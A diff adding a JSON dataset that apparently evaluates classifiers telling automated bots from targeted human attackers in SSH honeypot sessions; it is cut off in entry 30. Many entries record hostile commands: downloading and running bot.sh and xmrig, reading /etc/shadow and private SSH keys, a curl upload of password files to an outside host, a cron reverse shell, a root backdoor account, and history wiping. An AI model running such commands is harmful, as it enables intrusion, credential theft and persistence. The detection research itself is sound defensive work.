@@ -1,0 +1,800 @@
+[
+  {
+    "ordem": 1,
+    "session_id": "bot_01_9a1c3012f411",
+    "pausas_segundos": [
+      1
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 2,
+    "session_id": "bot_02_1fe070084516",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 3,
+    "session_id": "bot_03_4b8e2109c312",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 4,
+    "session_id": "bot_04_7c2d9018a104",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] echo xsec (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] echo xsec"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 5,
+    "session_id": "bot_05_3e7f1042b819",
+    "pausas_segundos": [
+      1
+    ],
+    "comandos_com_tempo": [
+      "[1] echo xsec (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] echo xsec"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 6,
+    "session_id": "bot_06_a84f92c10e3b",
+    "pausas_segundos": [
+      0,
+      0,
+      1,
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] cd /tmp (+0s)",
+      "[2] wget http://45.142.214.18/bot.sh (+0s)",
+      "[3] chmod +x bot.sh (+1s)",
+      "[4] ./bot.sh (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cd /tmp",
+      "[2] wget http://45.142.214.18/bot.sh",
+      "[3] chmod +x bot.sh",
+      "[4] ./bot.sh"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 7,
+    "session_id": "bot_07_c72e11049b21",
+    "pausas_segundos": [
+      0,
+      1,
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] cd /tmp (+0s)",
+      "[2] curl -O http://185.220.101.42/bins.sh (+1s)",
+      "[3] sh bins.sh (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cd /tmp",
+      "[2] curl -O http://185.220.101.42/bins.sh",
+      "[3] sh bins.sh"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 8,
+    "session_id": "bot_08_5d9a8120e402",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] cat /proc/cpuinfo (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cat /proc/cpuinfo"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 9,
+    "session_id": "bot_09_8f1b4039d715",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -a (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -a"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 10,
+    "session_id": "bot_10_2a6c7051f908",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 11,
+    "session_id": "bot_11_6e3d2094a517",
+    "pausas_segundos": [
+      1
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 12,
+    "session_id": "bot_12_1c8f5073b214",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] echo xsec (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] echo xsec"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 13,
+    "session_id": "bot_13_9d4e6018c623",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 14,
+    "session_id": "bot_14_4f2a9081d309",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] cat /proc/cpuinfo (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cat /proc/cpuinfo"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 15,
+    "session_id": "bot_15_7b5c1037e826",
+    "pausas_segundos": [
+      1
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 16,
+    "session_id": "bot_16_3a9d4062f118",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -a (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -a"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 17,
+    "session_id": "bot_17_8e1f7029a405",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 18,
+    "session_id": "bot_18_e19b44028c33",
+    "pausas_segundos": [
+      0,
+      0,
+      0,
+      1
+    ],
+    "comandos_com_tempo": [
+      "[1] cd /var/tmp (+0s)",
+      "[2] wget -q http://92.118.39.62/xmrig (+0s)",
+      "[3] chmod +x xmrig (+0s)",
+      "[4] ./xmrig (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cd /var/tmp",
+      "[2] wget -q http://92.118.39.62/xmrig",
+      "[3] chmod +x xmrig",
+      "[4] ./xmrig"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 19,
+    "session_id": "bot_19_5c7a3084b912",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_regras_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_regras_sem_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 20,
+    "session_id": "bot_20_f91d83b42a11",
+    "pausas_segundos": [
+      1,
+      2,
+      3,
+      4,
+      4,
+      4
+    ],
+    "comandos_com_tempo": [
+      "[1] id (+1s)",
+      "[2] uname -a (+2s)",
+      "[3] cat /etc/issue (+3s)",
+      "[4] ls -la /tmp (+4s)",
+      "[5] cat /proc/cpuinfo (+4s)",
+      "[6] crontab -l (+4s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] id",
+      "[2] uname -a",
+      "[3] cat /etc/issue",
+      "[4] ls -la /tmp",
+      "[5] cat /proc/cpuinfo",
+      "[6] crontab -l"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_neutro_sem_tempos": "BOT_AUTOMATIZADO"
+  },
+  {
+    "ordem": 21,
+    "session_id": "hum_01_dd2a67985225",
+    "pausas_segundos": [
+      1,
+      3,
+      6,
+      3,
+      6,
+      6
+    ],
+    "comandos_com_tempo": [
+      "[1] ls (+1s)",
+      "[2] mkdir teste123 (+3s)",
+      "[3] cd .. (+6s)",
+      "[4] ls (+3s)",
+      "[5] cd usr/ (+6s)",
+      "[6] exit (+6s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] ls",
+      "[2] mkdir teste123",
+      "[3] cd ..",
+      "[4] ls",
+      "[5] cd usr/",
+      "[6] exit"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO"
+  },
+  {
+    "ordem": 22,
+    "session_id": "hum_02_01b6a903bd25",
+    "pausas_segundos": [
+      7,
+      13,
+      9
+    ],
+    "comandos_com_tempo": [
+      "[1] ls -a (+7s)",
+      "[2] cd .bashrc (+13s)",
+      "[3] ipconfig (+9s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] ls -a",
+      "[2] cd .bashrc",
+      "[3] ipconfig"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO"
+  },
+  {
+    "ordem": 23,
+    "session_id": "hum_03_350bf1bd00da",
+    "pausas_segundos": [
+      14,
+      4,
+      4,
+      4,
+      4,
+      4,
+      4,
+      4,
+      4
+    ],
+    "comandos_com_tempo": [
+      "[1] whoami (+14s)",
+      "[2] uname -a (+4s)",
+      "[3] ls -la (+4s)",
+      "[4] cat /etc/passwd | grep sh (+4s)",
+      "[5] cat /etc/shadow (+4s)",
+      "[6] find / -perm -4000 2>/dev/null (+4s)",
+      "[7] mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys (+4s)",
+      "[8] history -c (+4s)",
+      "[9] exit (+4s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] whoami",
+      "[2] uname -a",
+      "[3] ls -la",
+      "[4] cat /etc/passwd | grep sh",
+      "[5] cat /etc/shadow",
+      "[6] find / -perm -4000 2>/dev/null",
+      "[7] mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys",
+      "[8] history -c",
+      "[9] exit"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO"
+  },
+  {
+    "ordem": 24,
+    "session_id": "hum_04_210b67150fee",
+    "pausas_segundos": [
+      3,
+      3,
+      3,
+      4,
+      4,
+      5,
+      5,
+      5,
+      3
+    ],
+    "comandos_com_tempo": [
+      "[1] id (+3s)",
+      "[2] pwd (+3s)",
+      "[3] ls -la /var/www (+3s)",
+      "[4] find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null (+4s)",
+      "[5] ps aux | grep -E 'mysql|postgres|nginx|apache' (+4s)",
+      "[6] tar -czf /tmp/backup_dump.tar.gz /etc/passwd /etc/shadow (+5s)",
+      "[7] curl -F 'file=@/tmp/backup_dump.tar.gz' http://198.51.100.99/upload (+5s)",
+      "[8] rm -f /tmp/backup_dump.tar.gz && history -c (+5s)",
+      "[9] exit (+3s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] id",
+      "[2] pwd",
+      "[3] ls -la /var/www",
+      "[4] find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null",
+      "[5] ps aux | grep -E 'mysql|postgres|nginx|apache'",
+      "[6] tar -czf /tmp/backup_dump.tar.gz /etc/passwd /etc/shadow",
+      "[7] curl -F 'file=@/tmp/backup_dump.tar.gz' http://198.51.100.99/upload",
+      "[8] rm -f /tmp/backup_dump.tar.gz && history -c",
+      "[9] exit"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO"
+  },
+  {
+    "ordem": 25,
+    "session_id": "hum_05_daac67c03d17",
+    "pausas_segundos": [
+      3,
+      3,
+      3,
+      4,
+      5,
+      5,
+      4
+    ],
+    "comandos_com_tempo": [
+      "[1] whoami && hostname (+3s)",
+      "[2] ip a (+3s)",
+      "[3] netstat -tulpn (+3s)",
+      "[4] cat ~/.ssh/id_rsa (+4s)",
+      "[5] crontab -l (+5s)",
+      "[6] echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/203.0.113.55/4443 0>&1\"' >> /etc/crontab (+5s)",
+      "[7] unset HISTFILE && exit (+4s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] whoami && hostname",
+      "[2] ip a",
+      "[3] netstat -tulpn",
+      "[4] cat ~/.ssh/id_rsa",
+      "[5] crontab -l",
+      "[6] echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/203.0.113.55/4443 0>&1\"' >> /etc/crontab",
+      "[7] unset HISTFILE && exit"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO"
+  },
+  {
+    "ordem": 26,
+    "session_id": "hum_06_b42c8190e103",
+    "pausas_segundos": [
+      5,
+      6,
+      8,
+      9,
+      8,
+      11,
+      9,
+      7
+    ],
+    "comandos_com_tempo": [
+      "[1] whoami (+5s)",
+      "[2] id (+6s)",
+      "[3] ls -la /var/www/ (+8s)",
+      "[4] cd /var/www/html && ls -la (+9s)",
+      "[5] cat /etc/os-release (+8s)",
+      "[6] find / -perm -4000 2>/dev/null (+11s)",
+      "[7] cat ~/.ssh/id_rsa (+9s)",
+      "[8] netstat -tulpn (+7s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] whoami",
+      "[2] id",
+      "[3] ls -la /var/www/",
+      "[4] cd /var/www/html && ls -la",
+      "[5] cat /etc/os-release",
+      "[6] find / -perm -4000 2>/dev/null",
+      "[7] cat ~/.ssh/id_rsa",
+      "[8] netstat -tulpn"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO"
+  },
+  {
+    "ordem": 27,
+    "session_id": "hum_07_c91e3048f216",
+    "pausas_segundos": [
+      4,
+      6,
+      6,
+      10,
+      6,
+      8,
+      5
+    ],
+    "comandos_com_tempo": [
+      "[1] whoami (+4s)",
+      "[2] sudo -l (+6s)",
+      "[3] cat /etc/passwd (+6s)",
+      "[4] echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd (+10s)",
+      "[5] crontab -l (+6s)",
+      "[6] cat /var/log/auth.log | tail -n 20 (+8s)",
+      "[7] history -c && rm -f ~/.bash_history (+5s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] whoami",
+      "[2] sudo -l",
+      "[3] cat /etc/passwd",
+      "[4] echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd",
+      "[5] crontab -l",
+      "[6] cat /var/log/auth.log | tail -n 20",
+      "[7] history -c && rm -f ~/.bash_history"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO"
+  },
+  {
+    "ordem": 28,
+    "session_id": "hum_08_d73f5021a804",
+    "pausas_segundos": [
+      4,
+      6,
+      7,
+      8,
+      9,
+      6
+    ],
+    "comandos_com_tempo": [
+      "[1] pwd (+4s)",
+      "[2] ls -la /home (+6s)",
+      "[3] cat /etc/group (+7s)",
+      "[4] ss -tulnp (+8s)",
+      "[5] find /etc -writable 2>/dev/null (+9s)",
+      "[6] history -c (+6s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] pwd",
+      "[2] ls -la /home",
+      "[3] cat /etc/group",
+      "[4] ss -tulnp",
+      "[5] find /etc -writable 2>/dev/null",
+      "[6] history -c"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO"
+  },
+  {
+    "ordem": 29,
+    "session_id": "hum_09_e54a9017b329",
+    "pausas_segundos": [
+      14,
+      38
+    ],
+    "comandos_com_tempo": [
+      "[1] cat /etc/shadow (+14s)",
+      "[2] history -c (+38s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cat /etc/shadow",
+      "[2] history -c"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO"
+  },
+  {
+    "ordem": 30,
+    "session_id": "hum_10_f18b6093c410",
+    "pausas_segundos": [
+      4,
+      5,
+      6,
+      7,
+      10,
+      5
+    ],
+    "comandos_com_tempo": [
+      "[1] id (+4s)",
+      "[2] uname -r (+5s)",
+      "[3] ls -la /root (+6s)",
+      "[4] cat /etc/sudoers (+7s)",
+      "[5] useradd -m -s /bin/bash suporte (+10s)",
+      "[6] history -c && exit (+5s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] id",
+      "[2] uname -r",
+      "[3] ls -la /root",
+      "[4] cat /etc/sudoers",
+      "[5] useradd -m -s /bin/bash suporte",
+      "[6] history -c && exit"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
